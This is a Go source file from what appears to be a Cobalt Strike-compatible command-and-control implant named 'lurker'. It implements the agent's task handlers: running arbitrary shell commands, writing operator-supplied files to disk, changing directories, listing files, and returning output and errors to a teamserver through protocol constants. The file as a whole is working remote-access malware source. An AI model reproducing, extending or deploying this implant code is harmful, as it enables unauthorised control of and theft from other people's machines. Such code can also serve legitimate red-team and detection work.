package commands

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"lurker/lurker/transports"
	"lurker/lurker/utilities"
)

const (
	CMD_TYPE_EXIT         = 3
	CMD_TYPE_SLEEP        = 4
	CMD_TYPE_CD           = 5
	CMD_TYPE_UPLOAD_START = 10
	CMD_TYPE_DOWNLOAD     = 11
	CMD_TYPE_CONNECT      = 14
	CMD_TYPE_SEND         = 15
	CMD_TYPE_CLOSE        = 16
	CMD_TYPE_LISTEN       = 17
	CMD_TYPE_PWD          = 39
	CMD_TYPE_FILE_BROWSE  = 53
	CMD_TYPE_UPLOAD_LOOP  = 67
	CMD_TYPE_SHELL        = 78
	CMD_TYPE_UDP_ASSOCIATE = 103
	CMD_TYPE_UDP_SEND      = 104
)

// Callback type constants (agent → teamserver)
const (
	CALLBACK_OUTPUT            = 0
	CALLBACK_FILE              = 2  // download start
	CALLBACK_CLOSE             = 4  // socks connection closed
	CALLBACK_READ              = 5  // socks data read
	CALLBACK_CONNECT           = 6  // socks connection established
	CALLBACK_FILE_WRITE        = 8  // download chunk
	CALLBACK_FILE_CLOSE        = 9  // download complete
	CALLBACK_PWD               = 19
	CALLBACK_FILE_BROWSE       = 22
	CALLBACK_DEAD              = 26 // exit confirmation
	CALLBACK_ERROR             = 31
	CALLBACK_OUTPUT_JOBS       = 56 // shell output, CS 4.12
	CALLBACK_PROCESS_STARTED   = 58 // shell started
	CALLBACK_PROCESS_COMPLETED = 59 // shell/job completed
)

func ParseCommandShell(b []byte) (string, string, []byte) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		panic(err)
	}
	pathLen := transports.ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		panic(err)
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		panic(err)
	}

	cmdLen := transports.ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	rawPath := string(path)
	envKey := strings.ReplaceAll(rawPath, "%", "")
	app := os.Getenv(envKey)
	return rawPath, app, cmd
}

// splitArgs splits a command string into tokens, respecting
// double-quoted and single-quoted substrings.
func splitArgs(s string) []string {
	var args []string
	var current strings.Builder
	inDouble := false
	inSingle := false

	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == '"' && !inSingle:
			inDouble = !inDouble
		case c == '\'' && !inDouble:
			inSingle = !inSingle
		case c == ' ' && !inDouble && !inSingle:
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteByte(c)
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}

// Run executes a process directly without a shell wrapper.
// The command string is tokenized: first token is the executable
// (resolved via PATH), remaining tokens are arguments.
func Run(command string) ([]byte, error) {
	tokens := splitArgs(strings.TrimSpace(command))
	if len(tokens) == 0 {
		return nil, fmt.Errorf("empty command")
	}
	cmd := exec.Command(tokens[0], tokens[1:]...)
	out, err := cmd.CombinedOutput()
	return out, err
}

func Shell(path string, args []byte) ([]byte, error) {
	switch runtime.GOOS {
	case "windows":
		args = bytes.Trim(args, " ")
		argsArray := strings.Split(string(args), " ")
		cmd := exec.Command(path, argsArray...)
		out, err := cmd.CombinedOutput()
		return out, err
	case "darwin":
		path = "/bin/bash"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	case "linux", "freebsd", "solaris":
		path = "/bin/sh"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	}
	args = bytes.Trim(args, " ")
	startPos := bytes.Index(args, []byte("-c"))
	args = args[startPos+3:]
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	out, err := cmd.CombinedOutput()
	return out, err
}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := transports.ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func Upload(filePath string, fileContent []byte) error {
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return err
	}
	defer fp.Close()
	_, err = fp.Write(fileContent)
	return err
}
func ChangeCurrentDir(path []byte, taskID [8]byte) {
	err := os.Chdir(string(path))
	if err != nil {
		ProcessErrorWithTaskID(err.Error(), taskID)
	}
}
func GetCurrentDirectory(taskID [8]byte) []byte {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		ProcessErrorWithTaskID(err.Error(), taskID)
		return nil
	}
	return []byte(result)
}

func File_Browse(b []byte, taskID [8]byte) []byte {
	buf := bytes.NewBuffer(b)
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		panic(err)
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		panic(err)
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		panic(err)
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		ProcessErrorWithTaskID(err.Error(), taskID)
		return nil
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		panic(err)
	}
	modTimeStr := modTime.Format("01/02/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	entries, err := os.ReadDir(dirPathStr)
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		modTimeStr = info.ModTime().Format("01/02/2006 15:04:05")

		if entry.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, entry.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", info.Size(), modTimeStr, entry.Name())
		}
	}
	return utilities.BytesCombine(pendingRequest, []byte(resultStr))
}

func ProcessErrorWithTaskID(errStr string, taskID [8]byte) {
	errIdBytes := transports.WriteInt(0) // must be zero
	arg1Bytes := transports.WriteInt(0)  // for debug
	arg2Bytes := transports.WriteInt(0)
	errMsgBytes := []byte(errStr)
	result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPacket := transports.MakePacket(CALLBACK_ERROR, taskID, result)
	transports.QueueResult(finalPacket)
}
